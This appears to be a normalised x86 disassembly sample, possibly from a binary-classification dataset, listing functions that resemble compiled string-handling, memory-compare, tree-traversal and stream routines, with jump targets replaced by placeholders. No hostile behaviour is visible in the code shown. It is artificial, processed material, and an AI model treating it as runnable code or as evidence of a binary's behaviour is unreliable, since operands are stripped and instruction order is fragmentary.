sub_401000
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ eax ]
xor ecx ecx
mov bl 0x1
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
inc ecx
cmp ecx edi
jb r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
test ecx ecx
je r-xdata
test bl bl
je r-xdata
cmp [ ecx + esi ] 0xed
cmp [ ecx + esi ] 0xfe
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
inc esi
test bl bl
sete bl
jne r-xdata
sub_401070
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_406775
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
add esp 0x4
sub_4010b0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_401140
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
pop ebp
retn
mov edi edi
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
sub_401180
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_406b90
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_4011c0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x45 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_401220
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
pop ebp
retn
nop
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
sub_401260
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov [ eax ] edx
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
retn
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
mov [ eax ] edx
retn
sub_4012c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x17
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
sub esp 0x14
and ecx eax
je r-xdata
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_406c8a
test cl 0x2
je r-xdata
call sub_40454b
mov edi eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0xc ] r--data
call sub_406719
push r--data
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_406c8a
call sub_40454b
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_406719
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_406c8a
call sub_40454b
lea edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_406719
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_406c8a
sub_4013c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4013f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_406775
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
add esp 0x4
sub_401420
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401450
push ebp
mov ebp esp
mov eax [ ecx + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov esi [ ebp + 0xc ]
sub eax edi
cmp eax esi
jae r-xdata
push r--data
call sub_404635
mov ebx [ ebp + 0x14 ]
mov edx esi
cmp esi ebx
jb r-xdata
mov esi eax
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ebx
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp esi ebx
jae r-xdata
mov ecx [ ebp + 0x10 ]
push edx
push ecx
add eax edi
push eax
call sub_4010b0
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp esi ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x10
sub_4014c0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_406807
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_406330
add esp 0xc
sub_401520
mov eax ecx
mov edx [ eax ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
retn
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov edx [ edx + 0x4 ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov [ eax ] edx
mov ecx [ eax ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
retn
jmp r-xdata
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
mov ecx edx
mov edx [ ecx ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
sub_401570
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_404635
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_406820
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_401600
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_406719
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_406c8a
push ecx
call sub_406c0a
add esp 0x4
test eax eax
jne r-xdata
sub_401650
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
cmp [ esi + 0x45 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_4016b0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_406807
add esp 0x4
sub_4016e0
push ebp
mov ebp esp
push 0xffffffff
push sub_413570
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
push edi
or esi 0xf
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_406719
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_406c8a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_401600
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_406c0a
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_406807
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ edi + ebx ] 0x0
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_406330
add esp 0xc
sub_401810
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_406c8a
int3
mov edx [ esi ]
push edx
call sub_406807
add esp 0x4
sub_401840
push esi
mov esi ecx
cmp [ esi + 0x30 ] 0x10
jb r-xdata
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_406807
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov ecx [ esi ]
push ecx
call sub_406807
add esp 0x4
sub_401890
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_4012c0
or eax 0x4
sub_4018e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_4045e8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_4016e0
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_406807
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_406330
add esp 0xc
sub_401990
push ebp
mov ebp esp
push 0xffffffff
push sub_413580
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
test [ edx + ecx + 0x14 ] 0x2
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
call sub_401890
sub_4019e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_404635
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_4045e8
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4045e8
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_4016e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_406330
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_401ad0
push ebp
mov ebp esp
push esi
mov esi ecx
mov edx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp edx edi
jb r-xdata
push r--data
call sub_404635
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ eax + 0x10 ]
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax edx
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
sub ebx [ ebp + 0x14 ]
mov ecx ebx
mov ebx [ ebp + 0x18 ]
cmp ecx ebx
jae r-xdata
mov [ ebp + 0xc ] eax
mov ecx edx
sub ecx [ ebp + 0xc ]
or edx 0xffffffff
sub edx ebx
cmp edx ecx
ja r-xdata
mov ebx ecx
sub eax [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
lea eax [ ecx + ebx ]
mov ecx [ esi + 0x10 ]
mov [ ebp + 0x18 ] eax
cmp ecx eax
jae r-xdata
push r--data
call sub_4045e8
cmp esi [ ebp + 0x10 ]
je r-xdata
cmp eax 0xfffffffe
jbe r-xdata
mov ecx [ ebp + 0xc ]
cmp ebx ecx
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx [ esi + 0x14 ]
cmp edx eax
jae r-xdata
push r--data
call sub_4045e8
mov eax [ ebp + 0x14 ]
cmp eax edi
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp + 0x18 ]
push ecx
push eax
mov ecx esi
call sub_4016e0
jmp r-xdata
add ecx edi
cmp ecx eax
mov eax [ esi + 0x14 ]
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] eax
cmp edx 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
push edx
add eax edi
push ecx
add eax ebx
push eax
call sub_406820
mov eax [ ebp + 0x10 ]
add esp 0xc
cmp [ eax + 0x14 ] 0x10
mov ecx eax
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
add ecx [ ebp + 0x14 ]
push ebx
push ecx
add eax edi
push eax
call sub_406820
mov eax [ esi + 0x14 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
add ecx [ ebp + 0x14 ]
push ebx
mov eax esi
push ecx
add eax edi
push eax
call sub_406330
jmp r-xdata
add ecx [ ebp + 0x14 ]
mov eax [ esi ]
push ebx
push ecx
add eax edi
push eax
call sub_406330
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
push edx
add eax edi
push ecx
add eax ebx
push eax
call sub_406820
mov eax [ esi + 0x14 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
mov eax esi
push edx
add eax edi
push ecx
add eax ebx
jmp r-xdata
mov eax [ esi ]
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
push edx
add eax edi
push ecx
add eax ebx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x18 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
pop ebx
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
push edx
push ecx
add eax edi
push eax
call sub_406820
mov eax [ esi + 0x14 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
push edx
add eax edi
push ecx
add eax ebx
push eax
call sub_406820
mov ecx [ esi + 0x14 ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
add ecx [ ebp + 0x14 ]
mov eax esi
push ebx
push ecx
add eax edi
jmp r-xdata
add ecx [ ebp + 0x14 ]
mov eax [ esi ]
push ebx
push ecx
add eax edi
jmp r-xdata
cmp eax 0x10
jb r-xdata
push eax
mov eax esi
pop edi
mov [ eax + ecx ] 0x0
pop esi
pop ebp
retn 0x14
mov eax [ esi ]
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x14
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
sub eax [ ebp + 0xc ]
push ebx
add eax [ ebp + 0x14 ]
mov ecx esi
add eax ebx
push eax
add ecx edi
push ecx
jmp r-xdata
sub eax [ ebp + 0xc ]
mov ecx [ esi ]
add eax [ ebp + 0x14 ]
push ebx
add eax ebx
push eax
add ecx edi
push ecx
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ ebp + 0x10 ] esi
mov ecx [ esi ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
add ecx edi
add ecx [ ebp + 0xc ]
push edx
add eax edi
push ecx
add eax ebx
push eax
call sub_406820
mov eax [ esi + 0x14 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
call sub_406820
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov edx ebx
sub edx [ ebp + 0xc ]
add eax edi
push edx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x14 ]
add edx ebx
add eax [ ebp + 0xc ]
push edx
sub_401df0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_4045e8
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4045e8
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_4016e0
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_401180
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_401ea0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_404635
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_401570
push ebx
push 0x0
mov ecx esi
call sub_401570
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4045e8
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_4016e0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_406330
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_401f90
push ebp
mov ebp esp
push 0xffffffff
push sub_413598
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call j_sub_407fd7
test al al
jne r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
pop esi
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_401990
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_402000
